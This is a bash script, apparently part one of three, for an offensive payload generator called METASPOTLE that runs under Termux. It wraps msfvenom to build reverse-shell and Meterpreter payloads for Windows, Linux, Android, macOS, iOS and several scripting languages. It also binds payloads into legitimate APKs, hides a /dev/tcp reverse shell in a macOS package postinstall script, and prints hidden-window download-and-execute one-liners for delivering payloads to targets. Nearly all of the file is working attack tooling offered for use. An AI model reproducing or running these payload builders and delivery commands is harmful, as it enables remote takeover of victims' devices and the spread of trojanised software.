#!/bin/bash

#===============================================================================
# METASPOTLE - Ultimate Payload Generator & C2 Framework for Termux
# PART 1/3 - Core Functions, Menu, Windows & Linux Payloads
#===============================================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; MAGENTA='\033[0;35m'; CYAN='\033[0;36m'; WHITE='\033[1;37m'
BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

banner() {
  clear
  echo -e "${RED}"
  echo '    __  ___      __            __    __        __       '
  echo '   /  |/  /___  / /____  _____/ /___/ /___  __/ /____ _ '
  echo '  / /|_/ / __ \/ __/ _ \/ ___/ / __  / __ \/ / __/ _ \ '
  echo ' / /  / / /_/ / /_/  __/ /  / / /_/ / /_/ / / /_/  __/ '
  echo '/_/  /_/\____/\__/\___/_/  /_/\__,_/\____/_/\__/\___/  '
  echo -e "${NC}"
  echo -e "${CYAN}══════════════════════════════════════════════════════════${NC}"
  echo -e "${GREEN}        Ultimate Payload Generator & C2 Framework${NC}"
  echo -e "${CYAN}══════════════════════════════════════════════════════════${NC}"
  echo ""
}

check_deps() {
  if ! command -v msfvenom &>/dev/null; then
    echo -e "${RED}[!] Metasploit Framework not found!${NC}"
    echo -e "${YELLOW}[*] Install: pkg install curl -y && source <(curl -fsSL https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh)${NC}"
    read -p "Press [Enter] to exit..."
    exit 1
  fi
}

init_tracker() {
  mkdir -p $HOME/.metaspotle
  SESSION_FILE="$HOME/.metaspotle/sessions.log"
  PAYLOAD_DIR="$HOME/metaspotle_payloads"
  TOOL_DIR="$HOME/metaspotle_tools"
  mkdir -p "$PAYLOAD_DIR" "$TOOL_DIR"
  touch "$SESSION_FILE"
}

get_ip() {
  IP=$(ip -4 addr show 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '127.0.0.1' | head -1)
  [ -z "$IP" ] && IP=$(ifconfig 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '127.0.0.1' | head -1)
  [ -z "$IP" ] && IP=$(hostname -I 2>/dev/null | awk '{print $1}')
  [ -z "$IP" ] && IP="127.0.0.1"
  echo "$IP"
}

get_lhost_lport() {
  default_ip=$(get_ip)
  echo -e "${YELLOW}[?] LHOST (listener IP)${NC}"
  read -p "$(echo -e ${CYAN}"[>] LHOST (default: $default_ip): "${NC})" LHOST
  LHOST=${LHOST:-$default_ip}
  echo -e "${YELLOW}[?] LPORT (listener port)${NC}"
  read -p "$(echo -e ${CYAN}"[>] LPORT (default: 4444): "${NC})" LPORT
  LPORT=${LPORT:-4444}
}

log_payload() {
  echo "[$(date)] $1 | LHOST=$2 LPORT=$3 | FILE=$4 | SIZE=$5" >> "$SESSION_FILE"
}

show_file_info() {
  if [ -f "$1" ] && [ -s "$1" ]; then
    SIZE=$(du -h "$1" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated!${NC}"
    echo -e "${WHITE}  File: ${GREEN}$1${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo ""
    echo -e "${BOLD}HTTP share:${NC}"
    echo -e "${YELLOW}  cd $PAYLOAD_DIR && python3 -m http.server 8888${NC}"
    echo -e "${DIM}  http://$LHOST:8888/$(basename $1)${NC}"
    echo ""
    return 0
  else
    echo -e "${RED}[FAIL] Generation FAILED!${NC}"
    return 1
  fi
}

#======= WINDOWS EXE =======
gen_win_exe() {
  clear; banner; echo -e "${BLUE}[*] Windows EXE Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Arch: [1] x86 [2] x64${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  echo -e "${YELLOW}[?] Type: [1] Meterpreter [2] Shell${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" type
  A="windows"; [ "$arch" == "2" ] && A="windows/x64"
  T="meterpreter/reverse_tcp"; [ "$type" == "2" ] && T="shell_reverse_tcp"
  FILENAME="windows_$(date +%s).exe"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p ${A}/${T} LHOST=$LHOST LPORT=$LPORT -f exe -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "WIN-EXE" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= WINDOWS DLL =======
gen_win_dll() {
  clear; banner; echo -e "${BLUE}[*] Windows DLL Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Arch: [1] x86 [2] x64${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  A="windows"; [ "$arch" == "2" ] && A="windows/x64"
  FILENAME="windows_dll_$(date +%s).dll"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p ${A}/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "WIN-DLL" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Execute:${NC} regsvr32 /s $FILENAME"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= WINDOWS POWERSHELL =======
gen_win_ps1() {
  clear; banner; echo -e "${BLUE}[*] Windows PowerShell Payload${NC}"
  get_lhost_lport
  FILENAME="powershell_$(date +%s).ps1"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f psh-reflection -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "WIN-PS1" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Execute:${NC} powershell -ExecutionPolicy Bypass -File $FILENAME"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= WINDOWS HTA =======
gen_win_hta() {
  clear; banner; echo -e "${BLUE}[*] Windows HTA Payload${NC}"
  get_lhost_lport
  FILENAME="payload_$(date +%s).hta"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hta-psh -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "WIN-HTA" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Send link:${NC} http://$LHOST:8888/$FILENAME"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= WINDOWS VBA/MACRO =======
gen_win_vba() {
  clear; banner; echo -e "${BLUE}[*] Windows VBA/Macro Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Format: [1] VBA [2] VBS${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" fmt
  F="vba"; [ "$fmt" == "2" ] && F="vbs"
  FILENAME="macro_$(date +%s).$F"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f $F -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "WIN-VBA" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Paste into MS Office Macro editor${NC}"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= WINDOWS MSI =======
gen_win_msi() {
  clear; banner; echo -e "${BLUE}[*] Windows MSI Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Arch: [1] x86 [2] x64${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  A="windows"; [ "$arch" == "2" ] && A="windows/x64"
  FILENAME="installer_$(date +%s).msi"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p ${A}/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "WIN-MSI" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Install:${NC} msiexec /quiet /qn /i $FILENAME"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= LINUX ELF =======
gen_linux_elf() {
  clear; banner; echo -e "${GREEN}[*] Linux ELF Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Arch: [1] x86 [2] x64 [3] ARM${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  case $arch in 1) P="linux/x86/meterpreter/reverse_tcp" ;; 2) P="linux/x64/meterpreter/reverse_tcp" ;; 3) P="linux/armle/meterpreter/reverse_tcp" ;; *) P="linux/x64/meterpreter/reverse_tcp" ;; esac
  FILENAME="linux_$(date +%s).elf"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p $P LHOST=$LHOST LPORT=$LPORT -f elf -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && chmod +x "$OUTPUT" && log_payload "LINUX-ELF" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= LINUX BASH =======
gen_linux_bash() {
  clear; banner; echo -e "${GREEN}[*] Linux Bash Reverse Shell${NC}"
  get_lhost_lport
  FILENAME="bash_$(date +%s).sh"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p cmd/unix/reverse_bash LHOST=$LHOST LPORT=$LPORT -f raw -o "$OUTPUT" 2>/dev/null
  if [ ! -f "$OUTPUT" ] || [ ! -s "$OUTPUT" ]; then
    cat > "$OUTPUT" << EOF
#!/bin/bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
EOF
  fi
  chmod +x "$OUTPUT"
  show_file_info "$OUTPUT" && log_payload "LINUX-BASH" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Execute:${NC} bash $FILENAME"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= ANDROID APK =======
gen_android_apk() {
  clear; banner; echo -e "${MAGENTA}[*] Android APK Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Bind to legit APK? (y/n)${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" bind_choice
  FILENAME="android_$(date +%s).apk"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  if [[ "$bind_choice" == "y" ]]; then
    read -p "$(echo -e ${CYAN}"[>] Path to APK: "${NC})" TEMPLATE_APK
    [ -f "$TEMPLATE_APK" ] && msfvenom -x "$TEMPLATE_APK" -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o "$OUTPUT" &>/dev/null || msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > "$OUTPUT" 2>/dev/null
  else
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > "$OUTPUT" 2>/dev/null
  fi
  show_file_info "$OUTPUT" && log_payload "ANDROID" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  command -v jarsigner &>/dev/null && [ -f "$HOME/.android/debug.keystore" ] && jarsigner -keystore $HOME/.android/debug.keystore -storepass android -keypass android "$OUTPUT" androiddebugkey &>/dev/null && echo -e "${GREEN}[OK] Signed${NC}" || echo -e "${YELLOW}[!] Enable unknown sources on target${NC}"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= macOS MACHO =======
gen_macos_macho() {
  clear; banner; echo -e "${MAGENTA}[*] macOS Mach-O Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Arch: [1] x86 [2] x64${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  P="osx/x86/shell_reverse_tcp"; [ "$arch" == "2" ] && P="osx/x64/meterpreter/reverse_tcp"
  FILENAME="macos_$(date +%s).macho"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p $P LHOST=$LHOST LPORT=$LPORT -f macho -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && chmod +x "$OUTPUT" && log_payload "MACOS" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= macOS PKG =======
gen_macos_pkg() {
  clear; banner; echo -e "${MAGENTA}[*] macOS PKG Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[*] Creating PKG wrapper...${NC}"
  PKGDIR="$TOOL_DIR/macos_pkg_$(date +%s)"
  mkdir -p "$PKGDIR/scripts"
  cat > "$PKGDIR/scripts/postinstall" << EOF
#!/bin/bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &
EOF
  chmod +x "$PKGDIR/scripts/postinstall"
  FILENAME="macos_installer_$(date +%s).pkg"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f macho -o "$PKGDIR/payload.bin" 2>/dev/null
  if [ -f "$PKGDIR/payload.bin" ]; then
    cd "$PKGDIR" && tar czf "$OUTPUT" . 2>/dev/null && cd "$HOME"
    show_file_info "$OUTPUT" && log_payload "MACOS-PKG" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  else
    echo -e "${RED}[FAIL]${NC}"
  fi
  rm -rf "$PKGDIR"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= iOS =======
gen_ios() {
  clear; banner; echo -e "${CYAN}[*] iOS Payload (jailbroken only)${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Type: [1] arm64 TCP [2] armle TCP [3] arm64 HTTPS${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" ios_type
  case $ios_type in 1) P="apple_ios/aarch64/meterpreter/reverse_tcp" ;; 2) P="apple_ios/armle/shell_reverse_tcp" ;; 3) P="apple_ios/aarch64/meterpreter/reverse_https" ;; *) P="apple_ios/aarch64/meterpreter/reverse_tcp" ;; esac
  FILENAME="iphone_$(date +%s).macho"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p $P LHOST=$LHOST LPORT=$LPORT -f macho -o "$OUTPUT" 2>/dev/null
  if [ ! -f "$OUTPUT" ] || [ ! -s "$OUTPUT" ]; then
    msfvenom -p osx/arm64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f macho -o "$OUTPUT" 2>/dev/null
  fi
  show_file_info "$OUTPUT" && chmod +x "$OUTPUT" && log_payload "IOS" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= PHP =======
gen_php() {
  clear; banner; echo -e "${YELLOW}[*] PHP Reverse Shell${NC}"
  get_lhost_lport
  FILENAME="php_$(date +%s).php"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "PHP" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= PYTHON =======
gen_python() {
  clear; banner; echo -e "${BLUE}[*] Python Payload${NC}"
  get_lhost_lport
  FILENAME="python_$(date +%s).py"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p python/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "PYTHON" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Execute:${NC} python3 $FILENAME"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= NODE.JS =======
gen_nodejs() {
  clear; banner; echo -e "${GREEN}[*] Node.js Payload${NC}"
  get_lhost_lport
  FILENAME="nodejs_$(date +%s).js"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  cat > "$OUTPUT" << EOF
(function(){
  var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);
  var c=new net.Socket();c.connect($LPORT,'$LHOST',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});
  return /a/;
})();
EOF
  show_file_info "$OUTPUT" && log_payload "NODEJS" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Execute:${NC} node $FILENAME"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= JAVA JAR =======
gen_java_jar() {
  clear; banner; echo -e "${YELLOW}[*] Java JAR Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Arch: [1] x86 [2] x64${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  P="java/shell_reverse_tcp"; [ "$arch" == "2" ] && P="java/x64/shell_reverse_tcp"
  FILENAME="java_$(date +%s).jar"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p $P LHOST=$LHOST LPORT=$LPORT -f jar -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "JAVA" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Execute:${NC} java -jar $FILENAME"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= WEB DELIVERY =======
gen_web_delivery() {
  clear; banner; echo -e "${CYAN}[*] Web Delivery One-Liner${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Target: [1] PowerShell [2] Python [3] PHP [4] Regsvr32${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" wd
  case $wd in
    1) echo -e "${GREEN}PS one-liner:${NC}"
       echo -e "${YELLOW}powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).downloadString('http://$LHOST:8888/payload.ps1')\"${NC}" ;;
    2) echo -e "${GREEN}Python one-liner:${NC}"
       echo -e "${YELLOW}python3 -c \"import urllib.request;exec(urllib.request.urlopen('http://$LHOST:8888/payload.py').read())\"${NC}" ;;
    3) echo -e "${GREEN}PHP one-liner:${NC}"
       echo -e "${YELLOW}php -r \"file_get_contents('http://$LHOST:8888/payload.php');\"${NC}" ;;
    4) echo -e "${GREEN}Regsvr32 one-liner:${NC}"
       echo -e "${YELLOW}regsvr32 /u /n /s /i:http://$LHOST:8888/payload.sct scrobj.dll${NC}" ;;
  esac
  echo -e "${BOLD}Host:${NC} cd $PAYLOAD_DIR && python3 -m http.server 8888"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

# Save this as part1, then source into main
export -f banner check_deps init_tracker get_ip get_lhost_lport log_payload show_file_info
export -f gen_win_exe gen_win_dll gen_win_ps1 gen_win_hta gen_win_vba gen_win_msi
export -f gen_linux_elf gen_linux_bash gen_android_apk gen_macos_macho gen_macos_pkg
export -f gen_ios gen_php gen_python gen_nodejs gen_java_jar gen_web_delivery
export SESSION_FILE PAYLOAD_DIR TOOL_DIR
